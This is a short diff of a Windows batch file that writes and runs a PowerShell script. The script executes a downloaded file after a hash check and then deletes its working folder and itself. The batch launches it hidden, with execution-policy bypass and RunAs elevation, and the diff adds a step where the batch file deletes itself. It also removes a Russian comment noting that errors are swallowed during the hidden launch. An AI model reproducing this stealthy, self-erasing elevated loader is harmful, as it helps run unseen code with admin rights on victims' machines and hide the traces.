@@ -24,7 +24,6 @@ echo         throw "SHA-256 mismatch"
 echo     }
 echo     Start-Process -FilePath $f -Wait
 echo } catch {
-echo     # Ошибки проглатываются при скрытом запуске
 echo } finally {
 echo     Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
 echo     Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
@@ -33,4 +32,5 @@ echo }
 
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File','%PS_FILE%' -Verb RunAs -WindowStyle Hidden"
 
+start "" /b cmd.exe /c "ping 127.0.0.1 -n 2 >nul & del /f /q "%~f0""
 exit /b 0
